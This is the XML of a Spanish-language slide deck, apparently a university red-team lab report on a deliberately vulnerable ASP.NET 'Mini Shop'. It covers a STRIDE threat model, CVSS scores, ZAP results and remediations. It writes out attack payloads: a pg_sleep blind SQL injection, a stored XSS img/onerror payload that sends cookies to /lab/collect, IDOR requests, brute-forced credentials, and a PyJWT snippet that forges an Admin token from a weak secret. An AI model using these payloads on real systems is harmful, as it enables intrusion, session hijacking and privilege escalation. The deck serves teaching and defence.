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5.png"/><Relationship Id="rId5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 · LABORATORIO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🛡️  UNAPEC Mini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843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Security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Modelo de Amenazas · Análisis de Seguridad · Fase 1 (Red Team)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846320"/>
            <a:ext cx="67052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556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Stack tecnológico, roles y despliegue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4688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Entidades, flujos y límites de confianza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9504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809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077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821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10 amenazas identificadas y clasificadas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02736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941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621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Demostración de Vulnerabilidades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89534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5 ataques ejecutados con evidencia Burp Suite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15968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4074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3342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Evidencia de Pentesting (Burp Suite)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6085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Capturas reales de Repeater, Intruder, HTTP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474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Puntuaciones CVSS v3.1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218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Evaluación de severidad por hallazgo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42431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1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7607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OWASP ZAP Scan + Conclusiones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6035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Scan automatizado y plan de remediación Fase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Stack tecnológico y configuración del laboratorio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⚙️  Servidor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ASP.NET Core 10 (Kestrel) — MVC/Razor + API Controllers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🗄️  Base de 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PostgreSQL 18 Alpine — 7 tablas, datos sintéticos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🐳  Contenedor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Docker Compose — bind 127.0.0.1:5081, read-only, non-root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🔐  Auth MVC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Cookie LabSession — HttpOnly=false en Red Team (intencionalmente)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🎫  Auth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JWT Bearer HS256 — secreto débil 'MiniShopLab2026' (15 bytes)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👥 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Cliente (4 cuentas) · Vendedor (1) · Admin (1)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Picture 19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29832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4572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Catálogo de productos — Vista pública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1 — Entidades, flujos de datos y límites de confianza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2C7BE5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Usuario</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(Cliente/Vendedor/Admin)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828800"/>
            <a:ext cx="2560320" cy="91440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94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ASP.NET Core</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>MVC/Razor +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286000" cy="9144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  <a:br/>
            <a:r>
              <a:t>(Datos sintéticos)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Burp / ZAP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>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840480"/>
            <a:ext cx="2286000" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6C757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Logs</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(stdout contenedor)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HTTP, cookies,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← HTML/JSON, cookie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3366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ EF Core/Npgsql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SQL raw (Red Team)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→ Logs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E44AD"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>→ HTTP loopback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029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Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>─ ─ ─  Trust Boundaries  ─ ─ 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TB-1: Navegador →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Entrada no confiable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TB-2: Herramientas →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loopback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TB-3: App → PostgreSQL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Límite proceso/datos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TB-4: /lab/collect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Flujo XSS cookie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TB-5: Contenedor → Host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127.0.0.1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C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>↗ Cookie robada → /lab/collect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10 amenazas identificadas — todas las categorías cubiertas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Spoofing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Suplantación de identidad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S-01: Enumeración de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S-02: JWT débil → forjar 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08760"/>
            <a:ext cx="54864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Tampering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Alteración de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T-01: SQLi blind en búsqueda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T-02: IDOR escritura en carrito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20" y="1508760"/>
            <a:ext cx="54864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Repudiation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Repudio de acciones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R-01: Sin tabla de auditoría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069080"/>
            <a:ext cx="548640" cy="5486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Info Disclosure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Divulgación de información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I-01: XSS + robo de cookie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I-02: BOLA lectura de datos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I-03: Enumeración login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34840" y="4069080"/>
            <a:ext cx="54864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Denial of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Denegación de servicio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D-01: Sin rate limit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4069080"/>
            <a:ext cx="548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Elev. of Privilege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Elevación de privilegios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E-01: Cookie/JWT →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1: SQL Injection Blind Time-Based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VULN-01 · CWE-89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9436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GET /api/products/search?q=&lt;payload&gt;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Enviar búsqueda normal → medir tiempo base (~0.005s)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2. Inyectar: q=no-match' OR (SELECT 1 FROM pg_sleep(2))=1 --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Medir tiempo de respuesta (~2.007s = +2.0s de retardo)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4. Confirmar con sqlmap: extraer nombre BD y tablas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Resultados (Burp Suite Repeater)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Baseline:  5ms  →  Con pg_sleep(2):  2034ms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Diferencia: ~2029ms de retardo (inyección confirmada)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🛠️ Herramientas: Burp Suite Repeater + Intruder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SQL raw con concatenación directa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del parámetro q usando rol minishop_search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4846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00400"/>
            <a:ext cx="4846320" cy="2726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0" y="5029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Página de búsqueda — punto de inyección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2: XSS Almacenado + Robo de Cookie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VULN-02 · CWE-79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POST /api/products/{id}/comments  +  GET /Products/Details/{id}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Cadena de ataque completa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Atacante (cliente-a) publica comentario malicioso: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&lt;img src=x onerror="fetch('/lab/collect?c='+...)"&gt;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El comentario se almacena sin sanitización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(@Html.Raw renderiza HTML crudo en modo Red Team)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Víctima (cliente-xss) visita /Products/Details/1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→ El JS inyectado ejecuta automáticamente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Cookie LabSession enviada a /lab/collect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/lab/collect?c=LabSession%3DCfDJ8... (HTTP 204)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Atacante replica cookie → suplanta sesión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/Account/Profile con cookie robada → ve 'cliente-xss'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@Html.Raw sin encoding + cookie sin HttpOnly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UI:R</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>S:C / C:H / I:N / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="05-product-detail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Detalle de producto con comentario XSS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3: IDOR / BOLA — Acceso No Autorizado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VULN-03 · CWE-639 · OWASP A01:2021 Broken Access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Endpoints afectados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/api/cart/{userId}  ·  /api/cart/{userId}/items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como cliente-a (sub=1) via /api/auth/login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IDOR Lectura — GET /api/cart/2 (carrito de B)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200: {userId:2, items:[Ratón demo, qty:5]}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IDOR Lectura — GET /api/cart/3 (carrito ADMIN)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200: {userId:3, items:[], total:0}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BOLA Escritura — POST /api/cart/2/items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201: carrito de otro usuario modificado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JWT forjado → GET /api/admin → HTTP 200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Lista completa de usuarios, productos y pedidos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Sin validación de ownership por recurso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S:U / C:H / I:H / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="06-cart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Carrito — punto de acceso IDOR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4: Autenticación Débil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VULN-04 · CWE-307 · OWASP A07:2021 Auth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Endpoints afectados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POST /api/auth/login  ·  POST /Account/Login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Enumeración de usuarios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'Contraseña incorrecta' vs 'Usuario inexistente'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Timing: usuario existente ~58ms, no existente ~31ms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Fuerza bruta sin rate limiting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10+ intentos seguidos sin bloqueo ni CAPTCHA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→ Diccionario: password123 → LabPass2026! → etc.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Credencial encontrada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cliente-brute:LabPass2026! en 5 intentos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mensajes diferenciados + sin rate limiting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ni lockout ni CAPTCHA en endpoint de login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2-log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Formulario de login — sin protección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5: JWT HS256 — Forja de Token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VULN-05 · CWE-345 · OWASP A02:2021 Cryptographic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GET /api/admin (requiere JWT con role=Admin)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normal como cliente-a → JWT con role=Cliente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/api/admin con token legítimo → HTTP 403 Forbidden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Descubrir secreto JWT de 15 bytes: 'MiniShopLab2026'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Secreto corto, fácil de adivinar o extraer del código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Forjar token con role=Admin usando PyJWT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s = b'MiniShopLab2026'.ljust(32, b'\x00')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jwt.encode({sub:1, role:'Admin', exp:...}, s, 'HS256')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GET /api/admin con token forjado → HTTP 200 OK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Acceso total: 5 usuarios, productos y pedidos expuestos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secreto HS256 de 15 bytes (zero-padded a 32)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S:C / C:H / I:H / A:N</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14" descr="08-adm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Panel admin — acceso con token forjado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F1-10 · SQL Injection — Burp Suite Repeater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Timing manual baseline vs inyección pg_sleep(2)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0-01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3604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Repeater: búsqueda normal → respuesta 5ms</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="F1-10-02-pgsl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3604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Repeater: pg_sleep(2) inyectado → 2034ms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37760"/>
            <a:ext cx="11247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SQLi Blind Time-Based CONFIRMADO — Delta: 2029ms (5ms → 2034ms)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Herramienta: Burp Suite Community Edition — Repeater tab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Target: http://127.0.0.1:5081/api/products/search?q=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F1-10 · SQLi — Burp Suite Intruder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Timing consistente en 5 intentos automatizados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0-03-intruder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4940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937760"/>
            <a:ext cx="11247120" cy="13716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Intruder: 5 payloads con pg_sleep — todos ~2000ms consistentemente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Confirma que la inyección es fiable y reproducible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sqlmap v1.10.10 también extrajo: BD=public, 8 tablas (CartItems, Carts, Comments, ...)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F1-11 · XSS Almacenado — Burp Suite Repeater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POST comentario malicioso + cookie theft vía /lab/collect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1-01-comment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3604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Repeater: POST comentario XSS → HTTP 201 Created</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="F1-11-02-cookie-th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3604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HTTP History: /lab/collect captura cookie (HTTP 204)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37760"/>
            <a:ext cx="11247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XSS Almacenado CONFIRMADO — Cadena completa: payload → cookie theft → exfiltración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@Html.Raw() renderiza sin escapar + Cookie sin HttpOnly → document.cookie accesible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Target: POST /api/products/1/comments → GET /lab/collect?c=LabSession%3D...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F1-11 · XSS — Session Replay con Cookie Robada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Atacante suplanta sesión de víctima con cookie exfiltrada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1-03-session-re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4940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937760"/>
            <a:ext cx="11247120" cy="9144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Session Hijacking CONFIRMADO — Cookie robada permite suplantación completa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Repeater: GET /Account/Profile con cookie LabSession robada → HTTP 200 (ve datos de víctima)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F1-12 · IDOR/BOLA — Burp Suite Repeater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cliente-a (sub=1) accede y modifica carrito de otros usuarios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2-01-idor-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3604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IDOR Lectura: GET /api/cart/2 con JWT de userId=1 → 200</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="F1-12-02-bola-w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3604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BOLA Escritura: POST /api/cart/2/items → 201 Created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37760"/>
            <a:ext cx="11247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IDOR + BOLA CONFIRMADO — Lectura y escritura en recursos de otros usuarios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Sin validación de ownership: JWT sub=1 accede a carrito userId=2 (items:1, total:475000)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Target: /api/cart/{userId} · /api/cart/{userId}/items — requiere JWT Bearer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F1-13 · Auth Débil — Burp Suite Repeater + Intruder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Enumeración de usuarios y fuerza bruta sin rate limiting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3-01-enum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3604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Enumeración: mensajes diferentes + timing side-channel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="F1-13-02-intruder-brute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3604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Intruder: brute force → LabPass2026! (5 intentos)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37760"/>
            <a:ext cx="11247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Auth Débil CONFIRMADO — Enumeración + Brute Force exitosos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Mensajes diferenciados (Contraseña incorrecta vs Usuario inexistente) + sin lockout/rate-limit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Target: POST /api/auth/login — 10+ intentos sin bloqueo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F1-14 · JWT HS256 — Forja de Token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403 (legítimo) → 200 (forjado) → 401 (control)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4-01-jwt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760720" cy="33604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Tres escenarios: 403 legítimo / 200 forjado / 401 control</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="F1-14-02-forge-scri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760720" cy="33604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Script PyJWT: forja token Admin con zero-padding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37760"/>
            <a:ext cx="11247120" cy="82296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C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Escalación de Privilegios CONFIRMADA — CVSS 9.6 CRITICAL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Secreto JWT de 15 bytes 'MiniShopLab2026' (zero-padded a 32) permite forjar Admin token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GET /api/admin con token forjado → HTTP 200: expone 5 usuarios + datos completos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OWASP ZAP — Baseline Scan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59 PASS · 9 WARN · 0 FAIL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BURP SUITE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="F1-14-03-zap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4940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Alertas principales detectadas por ZAP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8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CSP Header Not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5001768"/>
            <a:ext cx="914400" cy="20116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500176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39512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Missing Anti-clickjacking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5257800"/>
            <a:ext cx="914400" cy="20116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52578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X-Content-Type-Options Missing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5513831"/>
            <a:ext cx="91440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513831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51576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Permissions Policy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5769864"/>
            <a:ext cx="91440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57698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0760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User Controllable HTML (XSS)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6025896"/>
            <a:ext cx="914400" cy="20116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602589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55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Reporte completo: evidencias/zap-scan/zap-report.html · Herramienta: ghcr.io/zaproxy/zaproxy:stable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Resumen de Puntuaciones CVSS v3.1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Evaluación de severidad de los 5 hallazgos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00584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54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JWT HS256 Weak Secret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737360"/>
            <a:ext cx="4389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42316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14600"/>
            <a:ext cx="100584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514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IDOR/BOLA Carrito/Pedidos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9748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697480"/>
            <a:ext cx="3703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338328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47472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XSS Almacenado + Cookie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3657600"/>
            <a:ext cx="3108959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34340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43484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434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SQLi Blind Time-Based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61772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461772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39496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607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Auth Débil (Enum + Brute)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0" y="557784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7200" y="6309360"/>
            <a:ext cx="274320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CRITICAL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4720" y="6309360"/>
            <a:ext cx="274320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HIGH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92240" y="6309360"/>
            <a:ext cx="2743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 MEDIUM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 de la Aplicación — UNAPEC Mini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Capturas de las principales pantallas del sistema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="03-catalog-logg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832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Catálogo autenticado</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="04-profile-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83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Perfil de usuario</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="08-admin-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303520" cy="2983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 administración</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Picture 12" descr="09-seller-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303520" cy="2983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del vendedor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2: Blue Team — Remediaciones propuestas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✅ Fase 1 Completada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10 amenazas STRIDE identificadas y validadas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5 vulnerabilidades demostradas con evidencia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DFD validado contra la aplicación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CVSS v3.1 calculado para cada hallazgo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Pentesting ejecutado: Burp Suite + sqlmap + ZAP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Distribución de severidad:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="C0392B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>1 vulnerabilidad CRITICAL (CVSS 9.6)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="40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1 vulnerabilidad HIGH (CVSS 8.1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>3 vulnerabilidades MEDIUM (CVSS 5.3-6.8)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003366"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>📋 OWASP ZAP: 59 PASS, 9 WARN, 0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🔧 Plan de Remediación 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Migrar JWT a RS256 con par de llaves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forja de tokens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Validar ownership en carrito/pedidos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IDOR/BOLA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Sanitizar comentarios + CSP + HttpOnly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XSS almacenado y robo de cookie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Parametrizar consultas SQL (EF Core)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SQLi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Rate limiting con Redis + lockout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Mitiga fuerza bruta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Mensaje uniforme en login + bcrypt + TOTP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enumeración, fortalece autenticación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Tabla de auditoría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Trazabilidad de acciones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¡Gracias!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843"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>🛡️ UNAPEC Mini Shop Security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840480"/>
            <a:ext cx="48764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Fase 1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Octubre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